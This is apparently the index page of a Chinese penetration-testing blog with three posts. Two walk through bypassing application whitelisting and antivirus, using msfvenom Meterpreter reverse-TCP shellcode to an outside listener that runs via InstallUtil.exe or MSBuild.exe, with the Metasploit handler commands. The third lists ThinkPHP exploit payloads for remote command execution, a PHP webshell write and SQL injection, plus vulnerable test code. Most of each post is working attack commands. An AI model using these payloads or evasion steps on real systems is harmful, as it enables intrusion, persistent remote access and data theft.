<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="渗透测试 应急响应 代码审计">
<meta property="og:type" content="website">
<meta property="og:title" content="pplsec">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="pplsec">
<meta property="og:description" content="渗透测试 应急响应 代码审计">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="pplsec">
<meta name="twitter:description" content="渗透测试 应急响应 代码审计">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/">





  <title>pplsec</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">pplsec</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">爱安全 爱生活</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-首页">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-归档">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-分类">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-关于">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/InstallUtil&csc.exe-bypass-application-whitelisting/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="pplsec">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/ppl.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="pplsec">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/26/InstallUtil&csc.exe-bypass-application-whitelisting/" itemprop="url">InstallUtil&csc.exe-bypass application whitelisting</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-26T22:38:36+08:00">
                2019-03-26
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1）通过msfvenom生成C＃的shellcode"><a href="#1）通过msfvenom生成C＃的shellcode" class="headerlink" title="1）通过msfvenom生成C＃的shellcode"></a>1）通过msfvenom生成C＃的shellcode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=111.111.111.111 lport=4443 -f csharp</span><br></pre></td></tr></table></figure>
<p><img src="/images/InstallUtil&amp;csc.exe-bypass-application-whitelisting-1.png" alt=""></p>
<h3 id="2）下载InstallUtil-Shellcode-cs，将上面生成的shellcode复制到该cs文件中"><a href="#2）下载InstallUtil-Shellcode-cs，将上面生成的shellcode复制到该cs文件中" class="headerlink" title="2）下载InstallUtil-Shellcode.cs，将上面生成的shellcode复制到该cs文件中"></a>2）下载InstallUtil-Shellcode.cs，将上面生成的shellcode复制到该cs文件中</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260 </span><br><span class="line">InstallUtil-Shellcode-cs</span><br></pre></td></tr></table></figure>
<h3 id="3）csc编译InstallUtil-ShellCode-cs"><a href="#3）csc编译InstallUtil-ShellCode-cs" class="headerlink" title="3）csc编译InstallUtil-ShellCode.cs"></a>3）csc编译InstallUtil-ShellCode.cs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:D:\test\InstallUtil-shell.exe D:\test\InstallUtil-ShellCode.cs</span><br></pre></td></tr></table></figure>
<p>编译生成的文件后缀名无所谓exe dll txt都可以，但只能InstallUtil.exe来触发<br><img src="/images/InstallUtil&amp;csc.exe-bypass-application-whitelisting-2.png" alt=""></p>
<h3 id="4）InstallUtil-exe执行-反弹shell"><a href="#4）InstallUtil-exe执行-反弹shell" class="headerlink" title="4）InstallUtil.exe执行 反弹shell"></a>4）InstallUtil.exe执行 反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U D:\test\InstallUtil-shell.exe</span><br></pre></td></tr></table></figure>
<p><img src="/images/InstallUtil&amp;csc.exe-bypass-application-whitelisting-3.png" alt=""></p>
<p>成功bypass av，反弹shell：<br><img src="/images/InstallUtil&amp;csc.exe-bypass-application-whitelisting-4.png" alt=""></p>
<h3 id="补充：MSF开启监听"><a href="#补充：MSF开启监听" class="headerlink" title="补充：MSF开启监听"></a>补充：MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 172.16.0.19</span><br><span class="line">set LPORT 4443</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
<p><strong>参考:</strong><br><a href="https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/" target="_blank" rel="noopener">https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/</a> </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/MSBuild.exe-bypass-application-whitelisting/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="pplsec">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/ppl.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="pplsec">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/26/MSBuild.exe-bypass-application-whitelisting/" itemprop="url">MSBuild.exe-bypass application whitelisting</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-26T22:38:36+08:00">
                2019-03-26
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1）通过msfvenom生成C＃的shellcode"><a href="#1）通过msfvenom生成C＃的shellcode" class="headerlink" title="1）通过msfvenom生成C＃的shellcode"></a>1）通过msfvenom生成C＃的shellcode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=111.111.111.111 lport=4443 -f csharp</span><br></pre></td></tr></table></figure>
<p><img src="/images/MSBuild.exe-bypass-application-whitelisting-1.png" alt=""></p>
<h3 id="2）下载executes-20shellcode-xml，将上面生成的shellcode复制到该XML文件中"><a href="#2）下载executes-20shellcode-xml，将上面生成的shellcode复制到该XML文件中" class="headerlink" title="2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中"></a>2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml</span><br></pre></td></tr></table></figure>
<p>注意:从C＃shellcode中替换shellcode值，然后将msfvenom 生成的shellcode中的buf重命名为shellcode<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-2.png" alt=""></p>
<h3 id="3）MSBuild-exe编译上面xml文件，执行shellcode-反弹shell"><a href="#3）MSBuild-exe编译上面xml文件，执行shellcode-反弹shell" class="headerlink" title="3）MSBuild.exe编译上面xml文件，执行shellcode 反弹shell"></a>3）MSBuild.exe编译上面xml文件，执行shellcode 反弹shell</h3><p>或者将上面xml文件后缀修改为.csproj (C#项目文件的扩展名) ，然后MSBuild.exe编译，同样可以执行shellcode 反弹shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe D:\test\mstest.xml</span><br><span class="line">或者</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe  D:\test\mstest.csproj</span><br></pre></td></tr></table></figure>
<p><img src="/images/MSBuild.exe-bypass-application-whitelisting-3.png" alt=""><br>或者<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-4.png" alt=""></p>
<p>成功bypass av，反弹shell：<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-5.png" alt=""></p>
<h3 id="补充：MSF开启监听"><a href="#补充：MSF开启监听" class="headerlink" title="补充：MSF开启监听"></a>补充：MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 172.16.0.19</span><br><span class="line">set LPORT 4443</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
<p><strong>参考:</strong><br><a href="https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/" target="_blank" rel="noopener">https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/</a> </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/17/ThinkPHP典型漏洞总结20190111/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="pplsec">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/ppl.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="pplsec">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/17/ThinkPHP典型漏洞总结20190111/" itemprop="url">ThinkPHP典型漏洞总结20190111</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-17T22:16:32+08:00">
                2019-02-17
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1-ThinkPHP-5-0-x-Request类远程命令执行【20190111】"><a href="#1-ThinkPHP-5-0-x-Request类远程命令执行【20190111】" class="headerlink" title="1)    ThinkPHP 5.0.x Request类远程命令执行【20190111】"></a>1)    ThinkPHP 5.0.x Request类远程命令执行【20190111】</h3><p>受影响版本：<br>ThinkPHP 5.0.0 - ThinkPHP 5.0.23</p>
<p>在ThinkPHP 5.0.x 版本下，由于Request类的method 函数控制松散，导致可以通<br>过变量覆盖实现对任意函数进行调用，并且$_POST 将作为函数的参数传入，最终通过filterValue() 方法中的回调函数call_user_func()触发漏洞，实现远程命令执行</p>
<h4 id="ThinkPHP-5-0-15-POC"><a href="#ThinkPHP-5-0-15-POC" class="headerlink" title="ThinkPHP 5.0.15  POC"></a>ThinkPHP 5.0.15  POC</h4><p>下面POC 只有当debug模式开启时才可成功执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5015/public/index.php HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;mytest=whoami</span><br></pre></td></tr></table></figure></p>
<h4 id="ThinkPHP-5-0-23-POC"><a href="#ThinkPHP-5-0-23-POC" class="headerlink" title="ThinkPHP 5.0.23  POC"></a>ThinkPHP 5.0.23  POC</h4><p>下面POC  在debug模式无论关闭或开启均可成功执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5023/public/index.php?s=captcha HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure></p>
<p>下面POC 只有当debug模式开启时才可成功执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5023/public/index.php?s=captcha HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure></p>
<h3 id="2-ThinkPHP-5-x-controller远程命令执行【20181209】"><a href="#2-ThinkPHP-5-x-controller远程命令执行【20181209】" class="headerlink" title="2)    ThinkPHP 5.x  controller远程命令执行【20181209】"></a>2)    ThinkPHP 5.x  controller远程命令执行【20181209】</h3><p>受影响版本：<br>ThinkPHP 5.1.x ~ 5.1.31<br>ThinkPHP 5.0.x ~ 5.0.23</p>
<p>由于框架对于controller控制器名称没有做到足够的检测，导致在使用Pathinfo访问模式（没有开启强制路由）的情况下，造成可能的GetShell</p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>在debug模式无论关闭或开启均可成功执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">执行phpinfo</span><br><span class="line">http://127.0.0.1/thinkphp5015//public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line">执行系统命令</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"></span><br><span class="line">写info.php文件</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/info.php</span><br><span class="line"></span><br><span class="line">写一句话木马</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php/?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=www2.php&amp;vars[1][]=&lt;?php @ev[xxx]al($_POST[&apos;123&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="3-ThinkPHP-3-1、3-2-SQL注入-exp表达式-【20141211】"><a href="#3-ThinkPHP-3-1、3-2-SQL注入-exp表达式-【20141211】" class="headerlink" title="3)    ThinkPHP 3.1、3.2 SQL注入(exp表达式)【20141211】"></a>3)    ThinkPHP 3.1、3.2 SQL注入(exp表达式)【20141211】</h3><p>如果where语句的条件是数组，而且数组的第一个值是’exp’，那么第二个值就可以直接写SQL语句。这个特性在thinkphp3.1、3.2版本中均存在，通用性比较广。<br>I方法使用filter_exp函数过滤，是在exp后面会加个空格<br>但是filter_exp在I函数的fiter之前，所以如果开发者这样写I(‘get.school’, ‘’, ‘trim’)，那么会直接清除掉exp后面的空格，导致过滤无效。而这个写法是很普遍的。</p>
<h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://***.***.***.***/home/index/login</span><br><span class="line">POST提交</span><br><span class="line">uname[0]=exp&amp;uname[1]=%21%3D1 and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1))%23&amp;upwd=admin</span><br></pre></td></tr></table></figure>
<h3 id="4-ThinkPHP-5-0-9-信息泄露-SQL注入-in-【20170703】"><a href="#4-ThinkPHP-5-0-9-信息泄露-SQL注入-in-【20170703】" class="headerlink" title="4)    ThinkPHP 5.0.9 信息泄露+SQL注入(in)【20170703】"></a>4)    ThinkPHP 5.0.9 信息泄露+SQL注入(in)【20170703】</h3><p>ThinkPHP 5.0.9默认依旧是开放debug模式 (‘app_debug’  =&gt; true,)<br>触发该漏洞的关键词有：in 、not in<br>位置：select()、delete()、update()</p>
<h4 id="漏洞测试代码："><a href="#漏洞测试代码：" class="headerlink" title="漏洞测试代码："></a>漏洞测试代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">thinkphp509\application\index\controller\Index.php</span><br><span class="line">	public function sqlvul()</span><br><span class="line">&#123;</span><br><span class="line">    $ids = input(&apos;ids/a&apos;);  // /a 表示参数ids取值的规则是通过数组的形式来获取</span><br><span class="line">    $t = new User();</span><br><span class="line">    $result = $t-&gt;where(&apos;id&apos;, &apos;in&apos;, $ids)-&gt;select();</span><br><span class="line">	//$result = $t-&gt;where(&apos;id&apos;, &apos;not in&apos;, $ids)-&gt;select();</span><br><span class="line">	//$result = $t-&gt;where(&apos;id&apos;, &apos;in&apos;, $ids)-&gt;delete();</span><br><span class="line">	//$result = $t-&gt; update([&apos;username&apos; =&gt; &apos;thinkphp&apos;,&apos;id&apos;=&gt;[&apos;in&apos;,$ids]]);;</span><br><span class="line">    foreach($result as $row) &#123;</span><br><span class="line">        echo &quot;&lt;p&gt;Hello, &#123;$row[&apos;username&apos;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">thinkphp509\application\index\model\User.php</span><br><span class="line">&lt;?php</span><br><span class="line">namespace app\index\model;</span><br><span class="line">use think\Model;</span><br><span class="line">class User extends Model</span><br><span class="line">&#123;</span><br><span class="line">    protected $table = &apos;user&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正常请求：<br><a href="http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids=1" target="_blank" rel="noopener">http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids=1</a><br><a href="http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids[]=1&amp;ids[]=2" target="_blank" rel="noopener">http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids[]=1&amp;ids[]=2</a></p>
<h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids[0,updatexml(0,concat(0xa,user()),0)]=1</span><br></pre></td></tr></table></figure>
<p><img src="/images/ThinkPHP-VUL-SUM20190111-41.png" alt=""> </p>
<h3 id="5-ThinkPHP-lt-5-0-16-update-insert-注入-inc-【20180409】"><a href="#5-ThinkPHP-lt-5-0-16-update-insert-注入-inc-【20180409】" class="headerlink" title="5)    ThinkPHP &lt;5.0.16 update/insert 注入(inc)【20180409】"></a>5)    ThinkPHP &lt;5.0.16 update/insert 注入(inc)【20180409】</h3><h4 id="测试准备"><a href="#测试准备" class="headerlink" title="测试准备"></a>测试准备</h4><p>1）修改数据库配置信息 application/database.php<br>在 application/config.php 中打开调试和trace，app_debug和app_trace均为true。说明：app_debug设置为true是必须的，app_trace可不设<br>2）创建数据库为tptest，表名为user，其中有两个字段id和username<br>3）在 application/index/controller/Index.php 中Index类中添加方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public  function sqlvul()</span><br><span class="line">    &#123;</span><br><span class="line">        $username = input(&apos;get.username/a&apos;);</span><br><span class="line">        //db(&apos;user&apos;)-&gt;where([&apos;id&apos;=&gt; 5])-&gt;insert([&apos;username&apos;=&gt;$username]);</span><br><span class="line">db(&apos;user&apos;)-&gt;where([&apos;id&apos;=&gt; 3])-&gt;update([&apos;username&apos;=&gt;$username]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp5015/public/index.php/index/index/sqlvul?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php/index/index/sqlvul?username[0]=dec&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</span><br><span class="line">或者</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php/index/index/sqlvul?username[0]=inc&amp;username[1]=exp(~(select * from(select user())a))&amp;username[2]=1</span><br></pre></td></tr></table></figure>
<p><img src="/images/ThinkPHP-VUL-SUM20190111-51.png" alt=""> </p>
<h3 id="6-Thinkphp3-2-3-update注入-bind-【20180414】"><a href="#6-Thinkphp3-2-3-update注入-bind-【20180414】" class="headerlink" title="6)    Thinkphp3.2.3 update注入(bind)【20180414】"></a>6)    Thinkphp3.2.3 update注入(bind)【20180414】</h3><p>Thinkphp3.2.3是目前使用最广泛的thinkphp版本，虽然已经停止新功能的开发，但是应用的还是挺多</p>
<h4 id="漏洞测试代码：-1"><a href="#漏洞测试代码：-1" class="headerlink" title="漏洞测试代码："></a>漏洞测试代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function sqlvul3()&#123;</span><br><span class="line">        $User = M(&quot;user&quot;);</span><br><span class="line">        $user[&apos;id&apos;] = I(&apos;id&apos;);</span><br><span class="line">        $data[&apos;username&apos;] = I(&apos;username&apos;);</span><br><span class="line">        $data[&apos;password&apos;] = I(&apos;password&apos;);</span><br><span class="line">        $valu = $User-&gt;where($user)-&gt;save($data);</span><br><span class="line">        var_dump($valu);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>正常请求：（更新用户密码）<br><a href="http://127.0.0.1/thinkphp323/index.php/Home/Index/sqlvul3?username=admin&amp;password=123&amp;id=1" target="_blank" rel="noopener">http://127.0.0.1/thinkphp323/index.php/Home/Index/sqlvul3?username=admin&amp;password=123&amp;id=1</a></p>
<h4 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp323/index.php/Home/Index/sqlvul3?username=admin&amp;password=123&amp;&amp;id[0]=bind&amp;id[1]=0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure>
<p><img src="/images/ThinkPHP-VUL-SUM20190111-61.png" alt=""> </p>
